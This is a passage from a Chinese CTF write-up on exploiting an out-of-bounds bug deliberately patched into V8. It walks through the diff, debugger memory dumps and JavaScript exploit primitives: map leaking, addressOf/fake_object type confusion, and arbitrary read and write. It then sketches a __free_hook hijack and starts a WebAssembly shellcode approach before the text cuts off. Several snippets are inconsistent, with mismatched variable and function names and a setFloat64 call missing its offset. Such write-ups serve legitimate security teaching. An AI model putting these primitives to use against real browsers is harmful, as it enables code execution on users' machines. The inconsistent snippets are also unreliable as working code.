b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><p>整个题目就只有这样一个diff文件，这里主要需要注意的是中间那一块+号区域，在周围只是为了能够正常进行编译才添加的。</p><p>可以看到添加的这个函数在一开始就对参数的数量进行了判断，如果参数数量大于2则返回<code>undefined</code>，随后接受第一个到<code>receiver</code>中，进一步得到JSArray结构的变量array，紧接着通过array变量取出对应的<code>elements</code>，并且在最后拿到了数组的长度。</p><p>然后函数又进行判断，如果参数的数量为1则返回数组末尾的后一个地址的值，也就出现了越界读取的漏洞。</p><p>如果参数的数量为2则获取第二个参数到<code>value</code>中，然后写到数组末尾的后一个地址，也就出现了越界写的漏洞。</p><p><strong>需要注意的是，这里函数参数的第一个参数默认为this，所以 test_arr.oob() 的含义为一个参数</strong></p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>其实通过前面的基础知识章节和这里的漏洞分析之后可以很容易的看出来，在操作数组中的内容时都是这样一层一层找下去的。</p><p>而在js中对于数组中不是只能存放整型的变量，还可以存放各种类型的对象，而如何区分数组中变量类型就需要用到<code>JSArray</code>中的map成员进行区分。所以如果我们可以修改map成员即可实现类型混淆。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>虽然是找到了漏洞点，并且也知道了存在类型混淆的可能性，但根据目前的情况仍无法继续操作。因为可以看到前面我们在看<code>elements</code>结构中并没有看到map，也就无利用之谈了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x011117f8df49</span><br><span class="line">0x11117f8df49: [JSArray]</span><br><span class="line"> - map: 0x07bd46242ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x011117f8df21 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x011117f8df21 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 1.2</span><br><span class="line">           2: 1.3</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; telescope 0x011117f8df49-1</span><br><span class="line">00:0000│  0x11117f8df48 —▸ 0x7bd46242ed9 ◂— 0x40000020b620c01</span><br><span class="line">01:0008│  0x11117f8df50 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">02:0010│  0x11117f8df58 —▸ 0x11117f8df21 ◂— 0x20b620c14</span><br><span class="line">03:0018│  0x11117f8df60 ◂— 0x300000000</span><br><span class="line">04:0020│  0x11117f8df68 —▸ 0x7bd4624ab39 ◂— 0x40000020b620c01</span><br><span class="line">05:0028│  0x11117f8df70 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">06:0030│  0x11117f8df78 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">07:0038│  0x11117f8df80 ◂— 0x100000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x011117f8df21-1</span><br><span class="line">00:0000│  0x11117f8df20 —▸ 0x20b620c14f9 ◂— 0x20b620c01</span><br><span class="line">01:0008│  0x11117f8df28 ◂— 0x300000000</span><br><span class="line">02:0010│  0x11117f8df30 ◂— 0x3ff199999999999a</span><br><span class="line">03:0018│  0x11117f8df38 ◂— 0x3ff3333333333333</span><br><span class="line">04:0020│  0x11117f8df40 ◂— 0x3ff4cccccccccccd</span><br><span class="line">05:0028│  0x11117f8df48 —▸ 0x7bd46242ed9 ◂— 0x40000020b620c01</span><br><span class="line">06:0030│  0x11117f8df50 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">07:0038│  0x11117f8df58 —▸ 0x11117f8df21 ◂— 0x20b620c14</span><br></pre></td></tr></table></figure><p>但是在后续看浮点数中可以看到map的地址紧邻者<code>elements</code>的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x011117f8dfe1</span><br><span class="line">0x11117f8dfe1: [JSArray]</span><br><span class="line"> - map: 0x07bd46242f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x00eff64d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x011117f8dfb9 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x020b620c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3156b97801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x011117f8dfb9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">         0-2: 0x011117f8df69 &lt;Object map = 0x7bd4624ab39&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; telescope 0x011117f8dfe1-1 20</span><br><span class="line">00:0000│  0x11117f8dfe0 —▸ 0x7bd46242f79 ◂— 0x40000020b620c01</span><br><span class="line">01:0008│  0x11117f8dfe8 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">02:0010│  0x11117f8dff0 —▸ 0x11117f8dfb9 ◂— 0x20b620c08</span><br><span class="line">03:0018│  0x11117f8dff8 ◂— 0x300000000</span><br><span class="line">04:0020│  0x11117f8e000 —▸ 0x7bd46242e89 ◂— 0x40000020b620c01</span><br><span class="line">05:0028│  0x11117f8e008 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">06:0030│  0x11117f8e010 —▸ 0x11117f8e031 ◂— 0x20b620c08</span><br><span class="line">07:0038│  0x11117f8e018 ◂— 0x300000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x011117f8dfb9-1</span><br><span class="line">00:0000│  0x11117f8dfb8 —▸ 0x20b620c0801 ◂— 0x20b620c01</span><br><span class="line">01:0008│  0x11117f8dfc0 ◂— 0x300000000</span><br><span class="line">02:0010│  0x11117f8dfc8 —▸ 0x11117f8df69 ◂— 0x71000007bd4624ab</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">05:0028│  0x11117f8dfe0 —▸ 0x7bd46242f79 ◂— 0x40000020b620c01</span><br><span class="line">06:0030│  0x11117f8dfe8 —▸ 0x20b620c0c71 ◂— 0x20b620c08</span><br><span class="line">07:0038│  0x11117f8dff0 —▸ 0x11117f8dfb9 ◂— 0x20b620c08</span><br></pre></td></tr></table></figure><p>同样的，我们在数组中全是对象的时候也可以看到map的地址紧邻着这些数据。</p><p>注意那个地址的最后，它的值看起来不是对齐的。这是因为v8里有个<code>tagged pointer</code>机制，一个地址指向的如果不是SMI（就是小整数)，它的最低位就会打上一个标记，就会有个1，看起来就不是对齐的，用的时候要减1。</p><p>接着需要思考的事，一个越界读写能给我造成什么样的效果呢？</p><h4 id="1-泄漏map地址"><a href="#1-泄漏map地址" class="headerlink" title="1. 泄漏map地址"></a><strong>1. 泄漏map地址</strong></h4><p>这里泄漏map地址就很简单，在数组中的成员为对象和浮点型的时候直接调用oob函数即可获取到。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br></pre></td></tr></table></figure><h4 id="2-类型混淆获取任意对象地址"><a href="#2-类型混淆获取任意对象地址" class="headerlink" title="2. 类型混淆获取任意对象地址"></a><strong>2. 类型混淆获取任意对象地址</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">  obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">  obj_array.oob(flt_array_map);</span><br><span class="line">  <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">  obj_array.oob(obj_array_map);</span><br><span class="line">  <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的实现原理也是非常简单，首先就是将需要获取地址的对象放到<code>obj_array</code>中，随后使用<code>oob</code>函数将<code>flt_array_map</code>的地址写进去，这时再去访问<code>obj_array</code>中的成员时就会以float的形式返回出对应的地址了，最后在恢复类型即可。</p><h4 id="3-讲任意地址当作对象"><a href="#3-讲任意地址当作对象" class="headerlink" title="3. 讲任意地址当作对象"></a><strong>3. 讲任意地址当作对象</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">  flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">  flt_array.oob(obj_array_map);</span><br><span class="line">  <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">  flt_array.oob(flt_array_map);</span><br><span class="line">  <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实道理和上一步类似。</p><h4 id="4-实现任意地址读取"><a href="#4-实现任意地址读取" class="headerlink" title="4. 实现任意地址读取"></a><strong>4. 实现任意地址读取</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">  arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">  <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>首先这里是吧<code>arb_rw_arr</code>这个数组的<code>elements</code>区域当作的是一个<code>JSArray</code>结构体，而这个结构对应的指针为<code>fake_obj</code>。</p><p>这里主要解释一下第二行代码调用函数的部分，这里首先是拿到<code>arb_rw_arr</code>对象的地址，随后减去<code>0x20</code>则是因为<code>JSArray</code>和<code>elements</code>相距固定偏移为<code>0x30</code>，这里减去0x20的话代表将<code>elements + 0x10</code>当做了<code>fake JSArray</code>，根据前面的调试得知在<code>elements + 0x10</code>的位置开始为数组中数据的部分，所以我们现在是可以实现任意修改<code>fake_obj</code>的<code>JSArray</code>部分。</p><p>然后就是这里返回的<code>fake_obj</code>对象，这个对象实质指向的是就是<code>arb_rw_arr</code>的<code>elements + 0x10</code>的位置。</p><p>又因为可以任意修改这一部分的内容，所以我们可以修改<code>elements</code>指针，使其指向任意地址配合<code>fake_obj</code>对象即可达到任意地址读取的效果。</p><h4 id="5-实现任意地址写"><a href="#5-实现任意地址写" class="headerlink" title="5. 实现任意地址写"></a><strong>5. 实现任意地址写</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">  arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">  fake_obj[<span class="number">0</span>] = address;</span><br><span class="line">  data_view.setFloat64(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>任意地址写的写法在一开始的想法肯定是和任意地址读一致。不过按照上面那样写会出现一个段错误，这是简单的<code>write FloatArray</code>对浮点数的处理方式造成的，当值以 0x7f 开头等高处的地址都会出现这种问题。为了避免选择使用<code>DataView</code>来处理。</p><p><code>DataView</code>对象偏移<code>+0x20</code>处，存有一个<code>backing_store</code>指针，该指针指向真正存储数据的地址，改写这个指针即可任意读写。</p><h4 id="最终利用-传统方式"><a href="#最终利用-传统方式" class="headerlink" title="最终利用: 传统方式"></a><strong>最终利用: 传统方式</strong></h4><p>传统的方式是对<code>__free_hook</code>进行劫持。但是它在libc中，所以首先还是需要考虑泄漏出程序基地址，然后通过got表泄漏出libc地址。</p><p>不过目前遇到的是如何泄漏出程序基地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0fcdcb2c2d99</span><br><span class="line">0xfcdcb2c2d99: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_SMI_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x046dfe5804d1 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x1bc536f80609 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x08ad62ed1f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x08ad62ed1e59 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x046dfe584ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_SMI_ELEMENTS) -&gt; 0x0fcdcb2c2e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x08ad62ed1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x08ad62ed0ec1 &lt;JSFunction Array (sfi = 0x1bc536f86791)&gt;</span><br><span class="line"> - dependent code: 0x046dfe5802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><p>这里随便查看一个<code>JSArray</code>内部的map，可以看到其中包含这<code>constructor</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x08ad62ed0ec1</span><br><span class="line">0x8ad62ed0ec1: [Function] in OldSpace</span><br><span class="line"> - map: 0x0fcdcb2c2d49 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x08ad62ec2109 &lt;JSFunction (sfi = 0x1bc536f83b29)&gt;</span><br><span class="line"> - elements: 0x046dfe580c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: 0x08ad62ed1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - initial_map: 0x0fcdcb2c2d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: 0x1bc536f86791 &lt;SharedFunctionInfo Array&gt;</span><br><span class="line"> - name: 0x046dfe583599 &lt;String[#5]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: 65535</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x08ad62ec1869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x3eadb8bc6981 &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: 0x08ad62ed1029 &lt;PropertyArray[6]&gt; &#123;</span><br><span class="line">    #length: 0x1bc536f804b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x1bc536f80449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #prototype: 0x1bc536f80529 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    0x046dfe584c79 &lt;Symbol: (native_context_index_symbol)&gt;: 11 (const data field 0) properties[0]</span><br><span class="line">    0x046dfe584f41 &lt;Symbol: Symbol.species&gt;: 0x08ad62ed0fd9 &lt;AccessorPair&gt; (const accessor descriptor)</span><br><span class="line">    #isArray: 0x08ad62ed1069 &lt;JSFunction isArray (sfi = 0x1bc536f86829)&gt; (const data field 1) properties[1]</span><br><span class="line">    #from: 0x08ad62ed10a1 &lt;JSFunction from (sfi = 0x1bc536f86879)&gt; (const data field 2) properties[2]</span><br><span class="line">    #of: 0x08ad62ed10d9 &lt;JSFunction of (sfi = 0x1bc536f868b1)&gt; (const data field 3) properties[3]</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>constructor</code>可以看到有一个成员为code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x3eadb8bc6981-1</span><br><span class="line">0x3eadb8bc6980:0x0000046dfe580a310x0000046dfe582c01</span><br><span class="line">0x3eadb8bc6990:0x0000046dfe580c710x0000046dfe582791</span><br><span class="line">0x3eadb8bc69a0:0x00001bc536f916a90x800001c60000000d</span><br><span class="line">0x3eadb8bc69b0:0x000000240000001c0x000000a600000024</span><br><span class="line">0x3eadb8bc69c0:0x55a5afef9780ba490x000000e2ff410000</span><br><span class="line">0x3eadb8bc69d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x3eadb8bc69e0:0x0000046dfe580a310x0000046dfe582c01</span><br><span class="line">0x3eadb8bc69f0:0x0000046dfe580c710x0000046dfe582791</span><br><span class="line">0x3eadb8bc6a00:0x00001bc536f916c10x800001c60000000d</span><br><span class="line">0x3eadb8bc6a10:0x0000019f000001880x000000a70000019f</span><br></pre></td></tr></table></figure><p>在内部可以看到在距离开始位置为0x40的位置就能看到心心念念的程序基地址，所以直接通过这里泄漏即可。</p><p>泄漏完基地址就很好办，后续就是通过got表泄漏libc地址，然后劫持<code>__free_hook</code>即可为<code>system</code>，然后创建一个函数中申请变量为想要执行的命令。</p><blockquote><p>  我这里没看过源码，不过我猜测是因为js是动态变量的缘故，js的变量都是以堆的形式存在的，并且在函数执行结束后会释放掉内存。</p></blockquote><h4 id="最终利用-非传统方式"><a href="#最终利用-非传统方式" class="headerlink" title="最终利用: 非传统方式"></a><strong>最终利用: 非传统方式</strong></h4><p>这种方法则是往程序中写shellcode，但是程序自身并没有rwx的段。不过存在这样一种技术wasm，使用 <a class="link"   href="https://wasdk.github.io/WasmFiddle" >这个网站<i class="fas fa-external-link-alt"></i></a> 可以生成一段wasm码，可以用生成一个函数对象：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br></pre></td></tr></table></figure><p><img   src="/images/image-20230627191416891.png"  alt="image-20230627191416891"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = 